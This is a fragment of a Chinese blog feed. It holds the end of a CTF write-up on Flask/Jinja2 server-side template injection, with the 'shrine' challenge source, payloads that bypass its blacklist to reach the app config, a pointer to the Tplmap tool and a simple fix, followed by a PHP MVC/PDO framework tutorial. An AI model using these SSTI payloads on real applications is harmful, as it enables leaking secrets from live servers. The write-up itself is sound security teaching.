class="hljs-string">&#x27;FLAG&#x27;</span>)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">shrine</span>(<span class="hljs-params">shrine</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">safe_jinja</span>(<span class="hljs-params">s</span>):</span>        s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist])         + s    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(debug=<span class="hljs-literal">True</span>)</code></pre></div><p>读取flag需要查看config对象，但是config对象在黑名单中</p><div class="hljs code-wrapper"><pre><code class="hljs python">app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)</code></pre></div><p>我们可以通过别的方式获取到config对象</p><div class="hljs code-wrapper"><pre><code class="hljs python">&#123;&#123;self.__dict__&#125;&#125;&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;</code></pre></div><p>本质都是通过全局变量获取，直接使用ssti也可以</p><h2 id="2020-XCTF高校网络安全专题挑战赛-MINE1-1（Jinja2-SSTI）"><a href="#2020-XCTF高校网络安全专题挑战赛-MINE1-1（Jinja2-SSTI）" class="headerlink" title="2020 XCTF高校网络安全专题挑战赛 MINE1_1（Jinja2 SSTI）"></a>2020 XCTF高校网络安全专题挑战赛 MINE1_1（Jinja2 SSTI）</h2><h2 id="2020-XCTF高校网络安全专题挑战赛-MINE2（Jinja2-SSTI）"><a href="#2020-XCTF高校网络安全专题挑战赛-MINE2（Jinja2-SSTI）" class="headerlink" title="2020 XCTF高校网络安全专题挑战赛 MINE2（Jinja2 SSTI）"></a>2020 XCTF高校网络安全专题挑战赛 MINE2（Jinja2 SSTI）</h2><h1 id="Tplmap-工具"><a href="#Tplmap-工具" class="headerlink" title="Tplmap 工具"></a>Tplmap 工具</h1><p>Tplmap简介</p><p>Tplmap是一个python工具，可以通过使用沙箱转义技术找到代码注入和服务器端模板注入（SSTI）漏洞。该工具能够在许多模板引擎中利用SSTI来访问目标文件或操作系统。一些受支持的模板引擎包括PHP（代码评估），Ruby（代码评估），JaveScript（代码评估），Python（代码评估），ERB，Jinja2和Tornado。该工具可以执行对这些模板引擎的盲注入，并具有执行远程命令的能力。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">git <span class="hljs-built_in">clone</span> https://github.com/epinna/tplmap</code></pre></div><h1 id="flask-SSTI-修复"><a href="#flask-SSTI-修复" class="headerlink" title="flask SSTI 修复"></a>flask SSTI 修复</h1><p>简单修复：</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<span class="hljs-keyword">from</span> jinja2 <span class="hljs-keyword">import</span> Templateapp = Flask(__name__)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/safe&quot;</span></span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>    name = request.args.get(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;guest&#x27;</span>)    t = Template(<span class="hljs-string">&quot;Hello,&#123;&#123;n&#125;&#125; &quot;</span>)    <span class="hljs-keyword">return</span> t.render(n=name)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    app.run()</code></pre></div><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="SSTI/%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E8%AF%A6%E7%BB%86%E6%80%BB%E7%BB%93">SSTI/沙盒逃逸详细总结</a></li><li><a href="https://www.smi1e.top/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#file">Python 沙箱逃逸</a></li><li><a href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/#%E4%BD%BF%E7%94%A8%E8%84%9A%E6%9C%AC%E9%81%8D%E5%8E%86%E5%85%B6%E4%BB%96%E9%80%83%E9%80%B8%E6%96%B9%E6%B3%95">Python沙箱逃逸小结</a></li><li><a href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E6%9E%90Python-Flask-SSTI/#0x04-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">浅析Python Flask SSTI</a></li><li>[Flask/Jinja2 SSTI &amp;&amp; python 沙箱逃逸](Flask/Jinja2 SSTI &amp;&amp; python 沙箱逃逸)</li><li><a href="https://www.christa.top/details/7/">基于flask SSTI沙箱逃逸研究</a></li><li><a href="https://0day.work/jinja2-template-injection-filter-bypasses/">Jinja2 template injection filter bypasses</a></li><li><a href="https://0day.work/bsidessf-ctf-2017-web-writeups/#zumbo3">BsidesSF CTF 2017 web writeups</a></li><li><a href="https://www.onsecurity.co.uk/blog/server-side-template-injection-with-jinja2/">Jinja2 SSTI Research</a></li><li><a href="https://my.oschina.net/u/4395911/blog/3305216">fake google</a></li><li><a href="https://my.oschina.net/u/4357035/blog/3313766">WesternCTF2018 shrine</a></li><li><a href="https://whoamianony.top/2020/12/27/ctf-bi-sai-ji-lu/xctf-gao-xiao-wang-luo-an-quan-zhuan-ti-tiao-zhan-sai-writeup/#toc-heading-1">2020 XCTF高校网络安全专题挑战赛（Web部分）</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>python</category>
      
      <category>python沙箱逃逸</category>
      
      <category>flask SSTI</category>
      
      <category>巅峰极客2020</category>
      
      <category>ssti1</category>
      
      <category>buuctf</category>
      
      <category>fake google</category>
      
      <category>WesternCTF2018</category>
      
      <category>shrine</category>
      
      <category>XCTF高校网络安全专题挑战赛</category>
      
      <category>MINE1_1</category>
      
      <category>MINE2</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web安全</tag>
      
      <tag>ctf</tag>
      
      <tag>python沙箱逃逸</tag>
      
      <tag>flask SSTI</tag>
      
      <tag>tplmap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php从零开始开发属于自己的php框架</title>
    <link href="/2020/09/27/php%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%BC%80%E5%8F%91%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84php%E6%A1%86%E6%9E%B6/"/>
    <url>/2020/09/27/php%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%BC%80%E5%8F%91%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84php%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="php从零开始开发属于自己的php框架"><a href="#php从零开始开发属于自己的php框架" class="headerlink" title="php从零开始开发属于自己的php框架"></a>php从零开始开发属于自己的php框架</h1><h2 id="mvc框架理解"><a href="#mvc框架理解" class="headerlink" title="mvc框架理解"></a>mvc框架理解</h2><p>mv结构：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment"># model 模型</span><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select * from users&quot;</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> &amp;&amp; mysqli_num_rows(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;    <span class="hljs-variable">$rows</span> =mysqli_fetch_all(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;没有数据&lt;/h2&gt;&quot;</span>;&#125;<span class="hljs-comment"># view 视图</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2&gt;学生信息表&lt;/h2&gt;&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; align=&quot;center&quot; width=&quot;60%&quot;&gt;&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;username&lt;/th&gt;&lt;th&gt;password&lt;/th&gt;&lt;/tr&gt;&#x27;</span>;<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$rows</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;td&gt;&#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;td&gt;&#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;td&gt;&#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>].<span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/table&gt;&#x27;</span>;</code></pre></div><p>将其改为mvc模式：</p><p>model.php</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;select * from users&quot;</span>);<span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span> &amp;&amp; mysqli_num_rows(<span class="hljs-variable">$result</span>)&gt;<span class="hljs-number">0</span>)&#123;    <span class="hljs-variable">$rows</span> =mysqli_fetch_all(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;没有数据&lt;/h2&gt;&quot;</span>;&#125;</code></pre></div><p>view.php</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;h2&gt;学生信息表&lt;/h2&gt;&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;5&quot; align=&quot;center&quot; width=&quot;60%&quot;&gt;&#x27;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;username&lt;/th&gt;&lt;th&gt;password&lt;/th&gt;&lt;/tr&gt;&#x27;</span>;<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$rows</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;tr&gt;&#x27;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;td&gt;&#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;id&#x27;</span>].<span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;td&gt;&#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;username&#x27;</span>].<span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;td&gt;&#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;password&#x27;</span>].<span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;/table&gt;&#x27;</span>;</code></pre></div><p>mvc.php</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;model.php&quot;</span>;<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;view.php&quot;</span>;</code></pre></div><p>此时mvc.php就是一个控制器。</p><p>所以很好理解，对MVC架构的简单理解就是将数据库操作，前端展示分开，由统一的一个入口文件（控制器）进行控制。</p><p>实际的开发顺序应当为MCV，先写好模型，然后根据模型的需要编写控制器，最后根据模型的特点编写合适的模型。</p><h2 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h2><p>php语言的强大，离不开设计模式，php语言发展到今天，设计模式有几十种，本次介绍的是单例模式。</p><p>danli.php</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;    &#125;<span class="hljs-variable">$obj1</span> = <span class="hljs-keyword">new</span> Demo();<span class="hljs-variable">$obj2</span> = <span class="hljs-keyword">new</span> Demo();<span class="hljs-variable">$obj3</span> = <span class="hljs-keyword">new</span> Demo();var_dump(<span class="hljs-variable">$obj1</span>,<span class="hljs-variable">$obj2</span>,<span class="hljs-variable">$obj3</span>);</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">object</span>(Demo)<span class="hljs-comment">#1 (0) &#123;</span>&#125;<span class="hljs-keyword">object</span>(Demo)<span class="hljs-comment">#2 (0) &#123;</span>&#125;<span class="hljs-keyword">object</span>(Demo)<span class="hljs-comment">#3 (0) &#123;</span>&#125;</code></pre></div><p>#后的数字为对象的id号。从这个例子可以看到我们每次进行new 操作，都会产生一个完全的新的对象。实际上，对象的维护是非常消耗内存的。</p><p>如果我们以new的方式来生成这样的一个实例化对象，当我们在别的文件对这个类文件进行包含的时候，会再次进行new操作，这样实例化多个对象其实是没有必要的，实际场景下我们只需要调用这个类的特定方法，维护一个实例化对象就够了。单例模式就是用来解决这个问题的。</p><p>变量的引用传递</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;&#125;<span class="hljs-variable">$obj1</span> = <span class="hljs-keyword">new</span> Demo();<span class="hljs-variable">$obj2</span> = <span class="hljs-keyword">new</span> Demo();<span class="hljs-variable">$obj3</span> = <span class="hljs-keyword">new</span> Demo();<span class="hljs-variable">$obj4</span> = <span class="hljs-variable">$obj3</span>;var_dump(<span class="hljs-variable">$obj1</span>,<span class="hljs-variable">$obj2</span>,<span class="hljs-variable">$obj3</span>,<span class="hljs-variable">$obj4</span>);</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">object</span>(Demo)<span class="hljs-comment">#1 (0) &#123;</span>&#125;<span class="hljs-keyword">object</span>(Demo)<span class="hljs-comment">#2 (0) &#123;</span>&#125;<span class="hljs-keyword">object</span>(Demo)<span class="hljs-comment">#3 (0) &#123;</span>&#125;<span class="hljs-keyword">object</span>(Demo)<span class="hljs-comment">#3 (0) &#123;</span>&#125;</code></pre></div><p>可以看到通过引用传递生成的对象其实是已有对象的引用。学会这个知识点后即可开始单例模式的代码编写</p><p>单例模式需要完成以下几个要求</p><ul><li>维护一个私有属性，保存当前类的实例</li><li>私有化构造方法，禁止外部用new来创建类的实例</li><li>私有化克隆方法，禁止从外部克隆来生成类的实例</li><li>编写一个public方法来生成类的实例</li></ul><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;    <span class="hljs-comment">// 维护一个私有属性，保存当前类的实例</span>    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$instance</span> = <span class="hljs-literal">null</span>;        <span class="hljs-comment">//私有化构造方法，禁止外部用new来创建类的实例</span>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;    &#125;        <span class="hljs-comment">//私有化克隆方法，禁止从外部克隆来生成类的实例</span>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Implement __clone() method.</span>    &#125;    <span class="hljs-comment">//生成类的实例</span>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInstance</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">//判断私有属性$instance是否为当前类的实例</span>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">self</span>::<span class="hljs-variable">$instance</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">self</span>)        &#123;            <span class="hljs-built_in">self</span>::<span class="hljs-variable">$instance</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">self</span>();        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$instance</span>;    &#125;&#125;<span class="hljs-comment">//获取实例</span><span class="hljs-variable">$obj1</span> = Demo::getInstance();<span class="hljs-variable">$obj2</span> = Demo::getInstance();<span class="hljs-variable">$obj3</span> = Demo::getInstance();<span class="hljs-variable">$obj4</span> = Demo::getInstance();var_dump(<span class="hljs-variable">$obj1</span>,<span class="hljs-variable">$obj2</span>,<span class="hljs-variable">$obj3</span>,<span class="hljs-variable">$obj4</span>);</code></pre></div><h2 id="封装数据库操作类Db类"><a href="#封装数据库操作类Db类" class="headerlink" title="封装数据库操作类Db类"></a>封装数据库操作类Db类</h2><ul><li>创建当前类的单一实例</li><li>创建数据库的基本操作</li></ul><p>这部分的逻辑很简单，实现数据库操作的封装，基于PDO的方式进行编写。主要知识点在于熟悉PDO函数。</p><p>编写Db类，我们可以将所有参数保存在一个数组里。并且加上上节中的单例模式。有所不同的是，初始化部分我们需要将用户提供的额外配置加入默认配置，使用数组连接函数array_merge即可。并进行连接。这里connect函数尚未编写。</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Db</span></span>&#123;    <span class="hljs-comment">//数据库的默认连接参数</span>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$dbConfig</span> = [        <span class="hljs-string">&#x27;db&#x27;</span>=&gt;<span class="hljs-string">&#x27;mysql&#x27;</span>,        <span class="hljs-string">&#x27;host&#x27;</span>=&gt;<span class="hljs-string">&#x27;localhost&#x27;</span>,        <span class="hljs-string">&#x27;port&#x27;</span>=&gt;<span class="hljs-string">&#x27;3306&#x27;</span>,        <span class="hljs-string">&#x27;user&#x27;</span>=&gt;<span class="hljs-string">&#x27;root&#x27;</span>,        <span class="hljs-string">&#x27;pass&#x27;</span>=&gt;<span class="hljs-string">&#x27;root&#x27;</span>,        <span class="hljs-string">&#x27;charset&#x27;</span>=&gt;<span class="hljs-string">&#x27;utf8&#x27;</span>,        <span class="hljs-string">&#x27;dbname&#x27;</span>=&gt;<span class="hljs-string">&#x27;test&#x27;</span>,    ];    <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$instance</span> = <span class="hljs-literal">null</span>;        <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$params</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">//初始化连接参数</span>        <span class="hljs-keyword">$this</span>-&gt;dbConfig = array_merge(<span class="hljs-keyword">$this</span>-&gt;dbConfig,<span class="hljs-variable">$params</span>);        <span class="hljs-comment">//连接数据库</span>        <span class="hljs-keyword">$this</span>-&gt;connect();    &#125;    <span class="hljs-comment">/*</span><span class="hljs-comment">     * 禁止外部克隆</span><span class="hljs-comment">     */</span>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Implement __clone() method.</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getInstance</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">self</span>::<span class="hljs-variable">$instance</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">self</span>)&#123;            <span class="hljs-built_in">self</span>::<span class="hljs-variable">$instance</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">self</span>();        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-built_in">self</span>::<span class="hljs-variable">$instance</span>;    &#125;    &#125;</code></pre></div><p>connect函数：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-keyword">try</span>&#123;        <span class="hljs-comment">//配置数据源DSN</span>        <span class="hljs-variable">$dsn</span> = <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$this-&gt;dbConfig[&#x27;db&#x27;]&#125;</span>:host=<span class="hljs-subst">&#123;$this-&gt;dbConfig[&#x27;host&#x27;]&#125;</span>;</span><span class="hljs-string">        port=<span class="hljs-subst">&#123;$this-&gt;dbConfig[&#x27;port&#x27;]&#125;</span>;dbname=<span class="hljs-subst">&#123;$this-&gt;dbConfig[&#x27;dbname&#x27;]&#125;</span>;</span><span class="hljs-string">        charset=<span class="hljs-subst">&#123;$this-&gt;dbConfig[&#x27;charset&#x27;]&#125;</span>&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> PDO(<span class="hljs-variable">$dsn</span>,<span class="hljs-keyword">$this</span>-&gt;dbConfig[<span class="hljs-string">&#x27;user&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;dbConfig[<span class="hljs-string">&#x27;pass&#x27;</span>]);        <span class="hljs-comment">//设置客户端的默认字符集</span>        <span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;SET NAMES <span class="hljs-subst">&#123;$this-&gt;dbConfig[&#x27;charset&#x27;]&#125;</span>&quot;</span>);    &#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;数据库连接失败&quot;</span>.<span class="hljs-variable">$e</span>-&gt;getMessage());    &#125;&#125;</code></pre></div><p>这里涉及几个知识点：</p><ul><li><p>dsn</p><p>数据源名称或叫做 DSN，包含了请求连接到数据库的信息。</p><p>通常，一个 DSN 由 PDO 驱动名、紧随其后的冒号、以及具体 PDO 驱动的连接语法组成。更深入的信息能从 <a href="https://www.php.net/manual/zh/pdo.drivers.php">PDO 具体驱动文档</a>找到。</p><p>范例：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$dsn</span> = <span class="hljs-string">&#x27;mysql:dbname=testdb;host=127.0.0.1;port=3333&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><p>这里加上大括号没有影响。</p></li><li><p><a href="https://www.php.net/manual/zh/pdo.query.php">PDO::query</a> — 执行 SQL 语句，以 PDOStatement 对象形式返回结果集</p></li><li><p><a href="https://www.php.net/manual/zh/pdo.query.php">PDO::query</a> — 执行 SQL 语句，以 PDOStatement 对象形式返回结果集</p></li><li><p>设置客户端的默认字符集为我们配置的字符集相同。</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//设置客户端的默认字符集</span><span class="hljs-keyword">$this</span>-&gt;conn-&gt;query(<span class="hljs-string">&quot;SET NAMES <span class="hljs-subst">&#123;$this-&gt;dbConfig[&#x27;charset&#x27;]&#125;</span>&quot;</span>);</code></pre></div></li></ul><p>下一步是编写数据库的语句执行操作</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">/*</span><span class="hljs-comment"> * 完成数据表的写操作：新增、更新、删除</span><span class="hljs-comment"> * 返回受影响的记录，如果是新增返回新增主键id</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exec</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span></span>)</span>&#123;    <span class="hljs-variable">$num</span> = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;exec(<span class="hljs-variable">$sql</span>);    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$num</span> &gt; <span class="hljs-number">0</span>)&#123;        <span class="hljs-comment">//如果是插入操作，新增主键id</span>        <span class="hljs-keyword">if</span>(<span class="hljs-literal">null</span>!==<span class="hljs-keyword">$this</span>-&gt;conn-&gt;lastInsertId())&#123;            <span class="hljs-keyword">$this</span>-&gt;insertId = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;lastInsertId();        &#125;        <span class="hljs-keyword">$this</span>-&gt;num = <span class="hljs-variable">$num</span>;<span class="hljs-comment">//返回受影响的记录数量。</span>    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-variable">$error</span> = <span class="hljs-keyword">$this</span>-&gt;conn-&gt;errorInfo();<span class="hljs-comment">//获取最后操作的错误信息数组</span>        <span class="hljs-comment">//[0]错误标识符[1]错误代码[2]错误信息</span>        <span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;操作失败&#x27;</span>.<span class="hljs-variable">$error</span>[<span class="hljs-number">0</span>].<span class="hljs-string">&#x27;:&#x27;</span>.<span class="hljs-variable">$error</span>[<span class="hljs-number">1</span>].<span class="hljs-string">&#x27;:&#x27;</span>.<span class="hljs-variable">$error</span>[<span class="hljs-number">2</span>];    &#125;&#125;</code></pre></div><ul><li><p>这里可以添加一个成员变量$num用于记录收到影响的记录数量。</p></li><li><p><a href="https://www.php.net/manual/zh/pdo.exec.php">PDO::exec</a> — 执行一条 SQL 语句，并返回受影响的行数</p><p>实例：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&#x27;odbc:sample&#x27;</span>, <span class="hljs-string">&#x27;db2inst1&#x27;</span>, <span class="hljs-string">&#x27;ibmdb2&#x27;</span>);<span class="hljs-comment">/*  删除 FRUIT 数据表中满足条件的所有行 */</span><span class="hljs-variable">$count</span> = <span class="hljs-variable">$dbh</span>-&gt;exec(<span class="hljs-string">&quot;DELETE FROM fruit WHERE colour = &#x27;red&#x27;&quot;</span>);<span class="hljs-comment">/* 返回被删除的行数 */</span><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Deleted <span class="hljs-subst">$count</span> rows.\n&quot;</span>);<span class="hljs-meta">?&gt;</span></code></pre></div></li><li><p><a href="https://www.php.net/manual/zh/pdo.lastinsertid.php">PDO::lastInsertId</a> — 返回最后插入行的ID或序列值</p></li><li><p><a href="https://www.php.net/manual/zh/pdostatement.errorinfo.php">PDOStatement::errorInfo</a> — 获取跟上一次语句句柄操作相关的扩展错误信息</p><p>返回一个数组</p><table><thead><tr><th align="left">Element</th><th align="left">Information</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">SQLSTATE error code (a five characters alphanumeric identifier defined in the ANSI SQL standard).</td></tr><tr><td align="left">1</td><td align="left">Driver-specific error code.</td></tr><tr><td align="left">2</td><td align="left">Driver-specific error message.</td></tr></tbody></table><p>实例：</p><div 